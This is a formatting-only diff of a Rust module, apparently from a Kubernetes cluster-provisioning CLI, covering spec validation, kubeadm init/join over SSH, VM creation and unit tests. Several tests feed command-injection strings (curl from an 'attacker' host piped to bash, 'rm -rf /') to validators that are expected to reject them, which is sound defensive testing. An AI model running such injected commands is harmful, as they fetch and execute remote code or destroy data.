@@ -44,7 +44,11 @@ struct SshSpec {
 /// `EtcdSpec`/`KindModeSpec`.
 impl Default for SshSpec {
     fn default() -> Self {
-        SshSpec { user: default_ssh_user(), key: None, port: None }
+        SshSpec {
+            user: default_ssh_user(),
+            key: None,
+            port: None,
+        }
     }
 }
 
@@ -60,7 +64,9 @@ struct EtcdSpec {
 
 impl Default for EtcdSpec {
     fn default() -> Self {
-        EtcdSpec { mode: default_etcd_mode() }
+        EtcdSpec {
+            mode: default_etcd_mode(),
+        }
     }
 }
 
@@ -180,14 +186,16 @@ struct KindModeSpec {
 
 impl Default for KindModeSpec {
     fn default() -> Self {
-        KindModeSpec { image: default_node_image(), api_server_port: None }
+        KindModeSpec {
+            image: default_node_image(),
+            api_server_port: None,
+        }
     }
 }
 
 fn default_node_image() -> String {
     super::kindmode::DEFAULT_NODE_IMAGE.to_string()
 }
-
 
 /// Bloco `spec.vm` — só lido no `mode: vm`.
 #[derive(Debug, Default, Deserialize)]
@@ -223,14 +231,17 @@ fn default_service_subnet() -> String {
 fn valid_endpoint(s: &str) -> bool {
     !s.is_empty()
         && !matches!(s.chars().next(), Some('-') | Some(':'))
-        && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':'))
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':'))
 }
 
 /// CIDR simples (`10.244.0.0/16`) — só dígitos/`.`/`/`. Mesma justificação
 /// de segurança de [`valid_endpoint`] (usado em `--pod-network-cidr`/
 /// `--service-cidr` do `kubeadm init`).
 fn valid_cidr(s: &str) -> bool {
-    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit() || matches!(c, '.' | '/'))
+    !s.is_empty()
+        && s.chars()
+            .all(|c| c.is_ascii_digit() || matches!(c, '.' | '/'))
 }
 
 /// Versão do Kubernetes (`1.31` ou `1.31.2`) — só dígitos/`.`. Mesma
@@ -252,7 +263,8 @@ fn validate(spec: &ClusterSpec) -> Result<()> {
     if spec.mode == "ssh" && spec.control_plane.hosts.is_empty() {
         return Err(Error::Invalid(
             "spec.mode `ssh` exige `spec.controlPlane.hosts` — este modo NÃO cria máquinas, \
-             elas têm de existir e estar alcançáveis".into(),
+             elas têm de existir e estar alcançáveis"
+                .into(),
         ));
     }
     if spec.mode != "ssh" && !spec.control_plane.hosts.is_empty() {
@@ -271,7 +283,8 @@ fn validate(spec: &ClusterSpec) -> Result<()> {
     }
     if spec.control_plane.count() == 0 {
         return Err(Error::Invalid(
-            "spec.controlPlane vazio — pelo menos 1 nó obrigatório (`replicas: 1` ou 1 host)".into(),
+            "spec.controlPlane vazio — pelo menos 1 nó obrigatório (`replicas: 1` ou 1 host)"
+                .into(),
         ));
     }
     if spec.control_plane.count() > 1 && spec.control_plane_endpoint.is_none() {
@@ -283,30 +296,53 @@ fn validate(spec: &ClusterSpec) -> Result<()> {
     }
     if let Some(ep) = &spec.control_plane_endpoint {
         if !valid_endpoint(ep) {
-            return Err(Error::Invalid(format!("spec.controlPlaneEndpoint '{ep}' inválido (só host/IP[:porta])")));
+            return Err(Error::Invalid(format!(
+                "spec.controlPlaneEndpoint '{ep}' inválido (só host/IP[:porta])"
+            )));
         }
     }
     if !valid_cidr(&spec.pod_subnet) {
-        return Err(Error::Invalid(format!("spec.podSubnet '{}' inválido (formato CIDR esperado)", spec.pod_subnet)));
+        return Err(Error::Invalid(format!(
+            "spec.podSubnet '{}' inválido (formato CIDR esperado)",
+            spec.pod_subnet
+        )));
     }
     if !valid_cidr(&spec.service_subnet) {
-        return Err(Error::Invalid(format!("spec.serviceSubnet '{}' inválido (formato CIDR esperado)", spec.service_subnet)));
+        return Err(Error::Invalid(format!(
+            "spec.serviceSubnet '{}' inválido (formato CIDR esperado)",
+            spec.service_subnet
+        )));
     }
     if let Some(v) = &spec.k8s_version {
         if !valid_version(v) {
-            return Err(Error::Invalid(format!("spec.k8sVersion '{v}' inválido (só dígitos e pontos, ex.: '1.31')")));
+            return Err(Error::Invalid(format!(
+                "spec.k8sVersion '{v}' inválido (só dígitos e pontos, ex.: '1.31')"
+            )));
         }
     }
-    for h in spec.control_plane.hosts.iter().chain(spec.workers.hosts.iter()) {
+    for h in spec
+        .control_plane
+        .hosts
+        .iter()
+        .chain(spec.workers.hosts.iter())
+    {
         if !valid_endpoint(&h.ip) {
-            return Err(Error::Invalid(format!("host '{}' tem ip inválido: '{}'", h.label(), h.ip)));
+            return Err(Error::Invalid(format!(
+                "host '{}' tem ip inválido: '{}'",
+                h.label(),
+                h.ip
+            )));
         }
     }
     Ok(())
 }
 
 fn target_for(host: &HostSpec, ssh: &SshSpec) -> SshTarget {
-    SshTarget { host: host.ip.clone(), user: ssh.user.clone(), key: ssh.key.clone() }
+    SshTarget {
+        host: host.ip.clone(),
+        user: ssh.user.clone(),
+        key: ssh.key.clone(),
+    }
 }
 
 // `Kubeadm` é maior que `Apply` (muitos flags opcionais de provisionamento) —
@@ -412,14 +448,29 @@ pub enum ClusterCmd {
 }
 
 pub fn run(action: ClusterCmd) -> Result<()> {
-    if let ClusterCmd::Init { dir, name, image, force } = action {
+    if let ClusterCmd::Init {
+        dir,
+        name,
+        image,
+        force,
+    } = action
+    {
         return cmd_init(super::scaffold::Target::Cluster, dir, name, image, force);
     }
     // Modo kind nativo — não toca em SSH/VMs nem precisa de manifesto.
     match action {
         // Tratado no topo de `run` (faz `return`).
         ClusterCmd::Init { .. } => unreachable!("tratado acima"),
-        ClusterCmd::Create { ref name, api_port, workers, control_planes, ref image, ref pod_subnet, ref service_subnet, ref cni } => {
+        ClusterCmd::Create {
+            ref name,
+            api_port,
+            workers,
+            control_planes,
+            ref image,
+            ref pod_subnet,
+            ref service_subnet,
+            ref cni,
+        } => {
             let (images, store) = super::util::open_stores()?;
             let name = match name {
                 Some(n) => n.clone(),
@@ -430,7 +481,9 @@ pub fn run(action: ClusterCmd) -> Result<()> {
                 &store,
                 &super::kindmode::KindCluster {
                     name,
-                    image: image.clone().unwrap_or_else(|| super::kindmode::DEFAULT_NODE_IMAGE.to_string()),
+                    image: image
+                        .clone()
+                        .unwrap_or_else(|| super::kindmode::DEFAULT_NODE_IMAGE.to_string()),
                     api_port,
                     pod_subnet: pod_subnet.clone(),
                     service_subnet: service_subnet.clone(),
@@ -453,7 +506,10 @@ pub fn run(action: ClusterCmd) -> Result<()> {
     }
     match action {
         // Já tratados acima (modo kind nativo / init) — o topo de `run` faz `return`.
-        ClusterCmd::Create { .. } | ClusterCmd::Delete { .. } | ClusterCmd::Init { .. } | ClusterCmd::Ls => {
+        ClusterCmd::Create { .. }
+        | ClusterCmd::Delete { .. }
+        | ClusterCmd::Init { .. }
+        | ClusterCmd::Ls => {
             unreachable!("tratados acima")
         }
         ClusterCmd::Apply { file } => {
@@ -545,7 +601,9 @@ fn apply_kind(name: &str, spec: &ClusterSpec) -> Result<()> {
 /// Reaproveita o `provision_and_apply` do `cluster kubeadm` (zero duplicação).
 fn apply_vm(name: &str, spec: &ClusterSpec) -> Result<()> {
     let network = spec.vm.network.clone().ok_or_else(|| {
-        Error::Invalid("`mode: vm` exige `spec.vm.network` (cria-a antes com `delonix network create`)".into())
+        Error::Invalid(
+            "`mode: vm` exige `spec.vm.network` (cria-a antes com `delonix network create`)".into(),
+        )
     })?;
     let boot_timeout = spec
         .vm
@@ -574,16 +632,30 @@ fn apply_ssh(name: &str, spec: &ClusterSpec) -> Result<()> {
     let cri_bin = vmimage::resolve_cri_bin(None)?;
     let cri_service = vmimage::workspace_dist_file("delonix-cri.service")?;
 
-    let all_hosts: Vec<&HostSpec> = spec.control_plane.hosts.iter().chain(spec.workers.hosts.iter()).collect();
+    let all_hosts: Vec<&HostSpec> = spec
+        .control_plane
+        .hosts
+        .iter()
+        .chain(spec.workers.hosts.iter())
+        .collect();
     println!("cluster/{name}: a preparar {} host(s)...", all_hosts.len());
     for h in &all_hosts {
         let target = target_for(h, &spec.ssh);
-        prepare_host(&target, &h.label(), spec.k8s_version.as_deref(), &cri_bin, &cri_service)?;
+        prepare_host(
+            &target,
+            &h.label(),
+            spec.k8s_version.as_deref(),
+            &cri_bin,
+            &cri_service,
+        )?;
     }
 
     let cp1 = &spec.control_plane.hosts[0];
     let cp1_target = target_for(cp1, &spec.ssh);
-    let endpoint = spec.control_plane_endpoint.clone().unwrap_or_else(|| cp1.ip.clone());
+    let endpoint = spec
+        .control_plane_endpoint
+        .clone()
+        .unwrap_or_else(|| cp1.ip.clone());
     let info = kubeadm_init(&cp1_target, &cp1.label(), &endpoint, spec)?;
 
     for h in &spec.control_plane.hosts[1..] {
@@ -621,7 +693,9 @@ struct ProvisionArgs {
 
 /// Nomes determinísticos das VMs de um papel (`<cluster>-cp1`, `<cluster>-w1`, ...).
 fn vm_names(cluster_name: &str, role: &str, count: u32) -> Vec<String> {
-    (1..=count).map(|i| format!("{cluster_name}-{role}{i}")).collect()
+    (1..=count)
+        .map(|i| format!("{cluster_name}-{role}{i}"))
+        .collect()
 }
 
 /// Resolve a tag da imagem VM dourada a usar: explícita, ou a única existente
@@ -650,8 +724,12 @@ fn resolve_vm_image(store: &VmImageStore, explicit: Option<String>) -> Result<St
 fn generate_or_load_ssh_key(name: &str, explicit: Option<PathBuf>) -> Result<(PathBuf, String)> {
     if let Some(key) = explicit {
         let pub_path = key.with_extension("pub");
-        let public = std::fs::read_to_string(&pub_path)
-            .map_err(|e| Error::Invalid(format!("não consegui ler a chave pública '{}': {e}", pub_path.display())))?;
+        let public = std::fs::read_to_string(&pub_path).map_err(|e| {
+            Error::Invalid(format!(
+                "não consegui ler a chave pública '{}': {e}",
+                pub_path.display()
+            ))
+        })?;
         return Ok((key, public.trim().to_string()));
     }
     let dir = state_root().join("clusters").join(name);
@@ -685,12 +763,18 @@ fn wait_for_vm_ssh_ready(vm_name: &str, ssh: &SshSpec, timeout: Duration) -> Res
             break ip;
         }
         if Instant::now() >= deadline {
-            return Err(Error::Invalid(format!("VM '{vm_name}': sem IP atribuído dentro do --boot-timeout")));
+            return Err(Error::Invalid(format!(
+                "VM '{vm_name}': sem IP atribuído dentro do --boot-timeout"
+            )));
         }
         std::thread::sleep(Duration::from_secs(3));
     };
 
-    let target = SshTarget { host: ip.clone(), user: ssh.user.clone(), key: ssh.key.clone() };
+    let target = SshTarget {
+        host: ip.clone(),
+        user: ssh.user.clone(),
+        key: ssh.key.clone(),
+    };
     loop {
         if remote::ssh_check(&target, "true") {
             return Ok(ip);
@@ -713,11 +797,18 @@ fn provision_and_apply(args: ProvisionArgs) -> Result<()> {
     let image_tag = resolve_vm_image(&vm_store, args.vm_image.clone())?;
     let disk = vm_store.qcow2_path(&image_tag);
     if !disk.exists() {
-        return Err(Error::Invalid(format!("imagem VM '{image_tag}' não tem qcow2 em disco ({})", disk.display())));
+        return Err(Error::Invalid(format!(
+            "imagem VM '{image_tag}' não tem qcow2 em disco ({})",
+            disk.display()
+        )));
     }
 
     let (ssh_key_path, ssh_public) = generate_or_load_ssh_key(&args.name, args.ssh_key.clone())?;
-    let ssh = SshSpec { user: "delonix".to_string(), key: Some(ssh_key_path), port: None };
+    let ssh = SshSpec {
+        user: "delonix".to_string(),
+        key: Some(ssh_key_path),
+        port: None,
+    };
     let timeout = Duration::from_secs(args.boot_timeout);
 
     let cp_names = vm_names(&args.name, "cp", args.control_plane);
@@ -733,12 +824,18 @@ fn provision_and_apply(args: ProvisionArgs) -> Result<()> {
     let mut control_plane = Vec::with_capacity(cp_names.len());
     for vm_name in &cp_names {
         let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
-        control_plane.push(HostSpec { ip, hostname: Some(vm_name.clone()) });
+        control_plane.push(HostSpec {
+            ip,
+            hostname: Some(vm_name.clone()),
+        });
     }
     let mut worker_hosts = Vec::with_capacity(worker_names.len());
     for vm_name in &worker_names {
         let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
-        worker_hosts.push(HostSpec { ip, hostname: Some(vm_name.clone()) });
+        worker_hosts.push(HostSpec {
+            ip,
+            hostname: Some(vm_name.clone()),
+        });
     }
 
     let control_plane_endpoint = if control_plane.len() == 1 {
@@ -759,8 +856,14 @@ fn provision_and_apply(args: ProvisionArgs) -> Result<()> {
         ssh,
         etcd: EtcdSpec::default(),
         control_plane_endpoint,
-        control_plane: NodesSpec { replicas: None, hosts: control_plane },
-        workers: NodesSpec { replicas: None, hosts: worker_hosts },
+        control_plane: NodesSpec {
+            replicas: None,
+            hosts: control_plane,
+        },
+        workers: NodesSpec {
+            replicas: None,
+            hosts: worker_hosts,
+        },
         k8s_version: args.k8s_version,
         pod_subnet: args.pod_subnet,
         service_subnet: args.service_subnet,
@@ -781,7 +884,13 @@ fn create_and_wait(
     timeout: Duration,
 ) -> Result<String> {
     println!("cluster/{}: a criar VM {vm_name}...", args.name);
-    let seed = vm_cmd::generate_seed_iso(vm_name, Some(vm_name), std::slice::from_ref(&ssh_public.to_string()), None, &[])?;
+    let seed = vm_cmd::generate_seed_iso(
+        vm_name,
+        Some(vm_name),
+        std::slice::from_ref(&ssh_public.to_string()),
+        None,
+        &[],
+    )?;
     let cfg = delonix_vm::VmConfig {
         name: vm_name.to_string(),
         disk: disk.to_string_lossy().into_owned(),
@@ -831,7 +940,10 @@ fn prepare_host(
     } else {
         println!("[{label}] delonix-cri: a instalar...");
         remote::scp_to(target, cri_bin, "/tmp/delonix-cri")?;
-        remote::ssh_run(target, "mv /tmp/delonix-cri /usr/local/bin/delonix-cri && chmod +x /usr/local/bin/delonix-cri")?;
+        remote::ssh_run(
+            target,
+            "mv /tmp/delonix-cri /usr/local/bin/delonix-cri && chmod +x /usr/local/bin/delonix-cri",
+        )?;
         remote::scp_to(target, cri_service, "/tmp/delonix-cri.service")?;
         remote::ssh_run(
             target,
@@ -849,12 +961,23 @@ struct JoinInfo {
     certificate_key: Option<String>,
 }
 
-fn kubeadm_init(cp1: &SshTarget, label: &str, endpoint: &str, spec: &ClusterSpec) -> Result<JoinInfo> {
+fn kubeadm_init(
+    cp1: &SshTarget,
+    label: &str,
+    endpoint: &str,
+    spec: &ClusterSpec,
+) -> Result<JoinInfo> {
     if remote::ssh_check(cp1, "test -f /etc/kubernetes/admin.conf") {
-        println!("[{label}] kubeadm init: já satisfeito (SKIP) — a recuperar credenciais de join...");
+        println!(
+            "[{label}] kubeadm init: já satisfeito (SKIP) — a recuperar credenciais de join..."
+        );
         return recover_join_info(cp1);
     }
-    let k8s_ver_flag = spec.k8s_version.as_ref().map(|v| format!(" --kubernetes-version=v{v}")).unwrap_or_default();
+    let k8s_ver_flag = spec
+        .k8s_version
+        .as_ref()
+        .map(|v| format!(" --kubernetes-version=v{v}"))
+        .unwrap_or_default();
     let cmd = format!(
         "kubeadm init --control-plane-endpoint={endpoint} --upload-certs \
          --pod-network-cidr={} --service-cidr={}{k8s_ver_flag}",
@@ -868,27 +991,44 @@ fn kubeadm_init(cp1: &SshTarget, label: &str, endpoint: &str, spec: &ClusterSpec
 
 fn recover_join_info(cp1: &SshTarget) -> Result<JoinInfo> {
     let join_cmd = remote::ssh_run(cp1, "kubeadm token create --print-join-command")?;
-    let token = extract_after(&join_cmd, "--token ").ok_or_else(|| Error::Invalid("sem --token no join-command".into()))?;
-    let ca_cert_hash = extract_after(&join_cmd, "--discovery-token-ca-cert-hash ")
-        .ok_or_else(|| Error::Invalid("sem --discovery-token-ca-cert-hash no join-command".into()))?;
+    let token = extract_after(&join_cmd, "--token ")
+        .ok_or_else(|| Error::Invalid("sem --token no join-command".into()))?;
+    let ca_cert_hash =
+        extract_after(&join_cmd, "--discovery-token-ca-cert-hash ").ok_or_else(|| {
+            Error::Invalid("sem --discovery-token-ca-cert-hash no join-command".into())
+        })?;
     let cert_key_out = remote::ssh_run(cp1, "kubeadm init phase upload-certs --upload-certs")?;
     let certificate_key = extract_after(&cert_key_out, "Using certificate key:\n").or_else(|| {
         // formato alternativo (linha única "certificate key: <hex>") consoante a versão.
         extract_after(&cert_key_out, "certificate key:")
     });
-    Ok(JoinInfo { token, ca_cert_hash, certificate_key })
+    Ok(JoinInfo {
+        token,
+        ca_cert_hash,
+        certificate_key,
+    })
 }
 
 /// Extrai o kubeadm init/join output: `token`/`discovery-token-ca-cert-hash`
 /// vêm de `--flag valor`; `certificate-key` idem. Função pura, testada com
 /// uma amostra real de output.
 fn parse_join_info(output: &str) -> Result<JoinInfo> {
-    let token =
-        extract_after(output, "--token ").ok_or_else(|| Error::Invalid("não consegui extrair --token do output do kubeadm init".into()))?;
-    let ca_cert_hash = extract_after(output, "--discovery-token-ca-cert-hash ")
-        .ok_or_else(|| Error::Invalid("não consegui extrair --discovery-token-ca-cert-hash do output do kubeadm init".into()))?;
+    let token = extract_after(output, "--token ").ok_or_else(|| {
+        Error::Invalid("não consegui extrair --token do output do kubeadm init".into())
+    })?;
+    let ca_cert_hash =
+        extract_after(output, "--discovery-token-ca-cert-hash ").ok_or_else(|| {
+            Error::Invalid(
+                "não consegui extrair --discovery-token-ca-cert-hash do output do kubeadm init"
+                    .into(),
+            )
+        })?;
     let certificate_key = extract_after(output, "--certificate-key ");
-    Ok(JoinInfo { token, ca_cert_hash, certificate_key })
+    Ok(JoinInfo {
+        token,
+        ca_cert_hash,
+        certificate_key,
+    })
 }
 
 fn extract_after(text: &str, marker: &str) -> Option<String> {
@@ -898,17 +1038,27 @@ fn extract_after(text: &str, marker: &str) -> Option<String> {
     Some(value.trim_end_matches('\\').to_string())
 }
 
-fn kubeadm_join(target: &SshTarget, label: &str, endpoint: &str, info: &JoinInfo, as_control_plane: bool) -> Result<()> {
+fn kubeadm_join(
+    target: &SshTarget,
+    label: &str,
+    endpoint: &str,
+    info: &JoinInfo,
+    as_control_plane: bool,
+) -> Result<()> {
     if remote::ssh_check(target, "test -f /etc/kubernetes/kubelet.conf") {
         println!("[{label}] kubeadm join: já satisfeito (SKIP)");
         return Ok(());
     }
-    let mut cmd = format!("kubeadm join {endpoint}:6443 --token {} --discovery-token-ca-cert-hash {}", info.token, info.ca_cert_hash);
+    let mut cmd = format!(
+        "kubeadm join {endpoint}:6443 --token {} --discovery-token-ca-cert-hash {}",
+        info.token, info.ca_cert_hash
+    );
     if as_control_plane {
-        let key = info
-            .certificate_key
-            .as_ref()
-            .ok_or_else(|| Error::Invalid(format!("[{label}] sem certificate-key disponível para join de control-plane")))?;
+        let key = info.certificate_key.as_ref().ok_or_else(|| {
+            Error::Invalid(format!(
+                "[{label}] sem certificate-key disponível para join de control-plane"
+            ))
+        })?;
         cmd.push_str(&format!(" --control-plane --certificate-key {key}"));
     }
     println!("[{label}] kubeadm join: a correr...");
@@ -937,7 +1087,10 @@ fn fetch_kubeconfig(cp1: &SshTarget, cluster_name: &str) -> Result<()> {
         if !kube_config.exists() {
             std::fs::create_dir_all(&kube_dir)?;
             std::fs::copy(&dest, &kube_config)?;
-            println!("também copiado para {} (não existia ainda)", kube_config.display());
+            println!(
+                "também copiado para {} (não existia ainda)",
+                kube_config.display()
+            );
         }
     }
     Ok(())
@@ -950,21 +1103,33 @@ mod tests {
     #[test]
     fn vm_names_gera_nomes_deterministicos() {
         assert_eq!(vm_names("prod", "cp", 2), vec!["prod-cp1", "prod-cp2"]);
-        assert_eq!(vm_names("prod", "w", 3), vec!["prod-w1", "prod-w2", "prod-w3"]);
+        assert_eq!(
+            vm_names("prod", "w", 3),
+            vec!["prod-w1", "prod-w2", "prod-w3"]
+        );
         assert_eq!(vm_names("prod", "cp", 0), Vec::<String>::new());
     }
 
     #[test]
     fn resolve_vm_image_usa_a_explicita_sem_tocar_no_store() {
-        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-test-{}", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!(
+            "delonix-cluster-resolve-image-test-{}",
+            std::process::id()
+        ));
         let store = VmImageStore::open(&tmp).unwrap();
-        assert_eq!(resolve_vm_image(&store, Some("minha-tag".to_string())).unwrap(), "minha-tag");
+        assert_eq!(
+            resolve_vm_image(&store, Some("minha-tag".to_string())).unwrap(),
+            "minha-tag"
+        );
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
     #[test]
     fn resolve_vm_image_falha_claro_sem_imagens_locais() {
-        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-empty-{}", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!(
+            "delonix-cluster-resolve-image-empty-{}",
+            std::process::id()
+        ));
         let store = VmImageStore::open(&tmp).unwrap();
         let err = resolve_vm_image(&store, None).unwrap_err();
         assert!(format!("{err}").contains("build"));
@@ -973,7 +1138,10 @@ mod tests {
 
     #[test]
     fn resolve_vm_image_usa_a_unica_existente() {
-        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-one-{}", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!(
+            "delonix-cluster-resolve-image-one-{}",
+            std::process::id()
+        ));
         let store = VmImageStore::open(&tmp).unwrap();
         store
             .save(&vmimage::VmImage {
@@ -992,7 +1160,10 @@ mod tests {
 
     #[test]
     fn resolve_vm_image_falha_claro_com_multiplas_imagens() {
-        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-many-{}", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!(
+            "delonix-cluster-resolve-image-many-{}",
+            std::process::id()
+        ));
         let store = VmImageStore::open(&tmp).unwrap();
         for tag in ["a", "b"] {
             store
@@ -1047,7 +1218,9 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
 
     #[test]
     fn valid_endpoint_recusa_injeccao_de_comandos() {
-        assert!(!valid_endpoint("10.0.0.10; curl http://attacker/pwn.sh | bash; #"));
+        assert!(!valid_endpoint(
+            "10.0.0.10; curl http://attacker/pwn.sh | bash; #"
+        ));
         assert!(!valid_endpoint("$(curl http://attacker/pwn.sh)"));
         assert!(!valid_endpoint("`whoami`"));
         assert!(!valid_endpoint("10.0.0.10 && rm -rf /"));
@@ -1078,7 +1251,10 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
             mode: "ssh".into(),
             control_plane: NodesSpec {
                 replicas: None,
-                hosts: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
+                hosts: vec![HostSpec {
+                    ip: "10.0.0.1".into(),
+                    hostname: None,
+                }],
             },
             ..Default::default()
         }
@@ -1096,7 +1272,10 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
 
     #[test]
     fn validate_recusa_k8s_version_maliciosa() {
-        let spec = ClusterSpec { k8s_version: Some("1.31; curl evil|bash #".into()), ..spec_ssh_1cp() };
+        let spec = ClusterSpec {
+            k8s_version: Some("1.31; curl evil|bash #".into()),
+            ..spec_ssh_1cp()
+        };
         let err = validate(&spec).unwrap_err();
         assert!(format!("{err}").contains("k8sVersion"));
     }
@@ -1105,13 +1284,24 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     fn parse_join_info_extrai_token_hash_e_certificate_key() {
         let info = parse_join_info(SAMPLE_KUBEADM_INIT_OUTPUT).unwrap();
         assert_eq!(info.token, "abcdef.0123456789abcdef");
-        assert_eq!(info.ca_cert_hash, "sha256:1111111111111111111111111111111111111111111111111111111111111111");
-        assert_eq!(info.certificate_key.as_deref(), Some("2222222222222222222222222222222222222222222222222222222222222222"));
+        assert_eq!(
+            info.ca_cert_hash,
+            "sha256:1111111111111111111111111111111111111111111111111111111111111111"
+        );
+        assert_eq!(
+            info.certificate_key.as_deref(),
+            Some("2222222222222222222222222222222222222222222222222222222222222222")
+        );
     }
 
     #[test]
     fn validate_recusa_etcd_external() {
-        let spec = ClusterSpec { etcd: EtcdSpec { mode: "external".into() }, ..spec_ssh_1cp() };
+        let spec = ClusterSpec {
+            etcd: EtcdSpec {
+                mode: "external".into(),
+            },
+            ..spec_ssh_1cp()
+        };
         let err = validate(&spec).unwrap_err();
         assert!(format!("{err}").contains("etcd"));
     }
@@ -1122,8 +1312,14 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
             control_plane: NodesSpec {
                 replicas: None,
                 hosts: vec![
-                    HostSpec { ip: "10.0.0.1".into(), hostname: None },
-                    HostSpec { ip: "10.0.0.2".into(), hostname: None },
+                    HostSpec {
+                        ip: "10.0.0.1".into(),
+                        hostname: None,
+                    },
+                    HostSpec {
+                        ip: "10.0.0.2".into(),
+                        hostname: None,
+                    },
                 ],
             },
             ..spec_ssh_1cp()
@@ -1139,7 +1335,10 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
 
     #[test]
     fn validate_recusa_control_plane_vazio() {
-        let spec = ClusterSpec { control_plane: NodesSpec::default(), ..spec_ssh_1cp() };
+        let spec = ClusterSpec {
+            control_plane: NodesSpec::default(),
+            ..spec_ssh_1cp()
+        };
         assert!(validate(&spec).is_err());
     }
 
@@ -1162,7 +1361,10 @@ k8sVersion: \"1.31\"
         let spec: ClusterSpec = serde_yaml::from_str(yaml).unwrap();
         assert_eq!(spec.control_plane.hosts.len(), 2);
         assert_eq!(spec.workers.hosts.len(), 1);
-        assert_eq!(spec.control_plane_endpoint.as_deref(), Some("lb.exemplo.com"));
+        assert_eq!(
+            spec.control_plane_endpoint.as_deref(),
+            Some("lb.exemplo.com")
+        );
         assert_eq!(spec.pod_subnet, default_pod_subnet());
     }
 
@@ -1192,7 +1394,13 @@ k8sVersion: \"1.31\"
 }
 
 /// Trata o `init` deste grupo (ver `cmd::scaffold`).
-fn cmd_init(target: super::scaffold::Target, dir: PathBuf, name: Option<String>, image: Option<String>, force: bool) -> Result<()> {
+fn cmd_init(
+    target: super::scaffold::Target,
+    dir: PathBuf,
+    name: Option<String>,
+    image: Option<String>,
+    force: bool,
+) -> Result<()> {
     let name = name.unwrap_or_else(|| {
         // Sem `--name`, usa o nome do DIRECTÓRIO. Não se pode usar `canonicalize`:
         // o directório ainda não existe (é o `init` que o cria) e falharia sempre,
@@ -1208,5 +1416,15 @@ fn cmd_init(target: super::scaffold::Target, dir: PathBuf, name: Option<String>,
             .map(|n| n.to_string_lossy().into_owned())
             .unwrap_or_else(|| "app".to_string())
     });
-    super::scaffold::init(target, &super::scaffold::InitOpts { dir, name, image, force, template: None, up: false })
+    super::scaffold::init(
+        target,
+        &super::scaffold::InitOpts {
+            dir,
+            name,
+            image,
+            force,
+            template: None,
+            up: false,
+        },
+    )
 }
